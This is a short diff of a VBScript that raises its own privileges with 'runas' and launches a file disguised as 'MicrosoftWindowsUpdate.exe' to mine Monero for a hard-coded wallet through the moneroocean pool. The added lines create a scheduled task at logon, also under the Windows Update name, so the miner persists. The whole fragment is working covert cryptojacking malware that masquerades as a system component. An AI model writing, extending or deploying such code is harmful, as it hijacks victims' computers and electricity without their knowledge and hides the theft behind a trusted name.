@@ -3,5 +3,7 @@ If Not WScript.Arguments.Named.Exists("elevate") Then
     , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
   WScript.Quit
 End If
+set pt = wscript.createobject("WScript.shell")
+pt.run("cmd.exe /c SCHTASKS /Create /sc ONLOGON /tn ""MicrosoftWindowsUpdate"" /tr """"%localappdata%\MicrosoftWindowsUpdate.vbs"""""), 0, true
 set ws = wscript.createobject("WScript.shell")
 ws.run("cmd.exe /c %localappdata%\MicrosoftWindowsUpdate.exe -o gulf.moneroocean.stream:10128 -u 4BGXfWBzrSYN8yLPWL2MNF8QbXYZSopr4EEFzXQUSt3s2dafar2SNo7Jjy1iUpSu3TFXYPZtYsshi5Dx57RReCis3HLRUYD"), 0, true
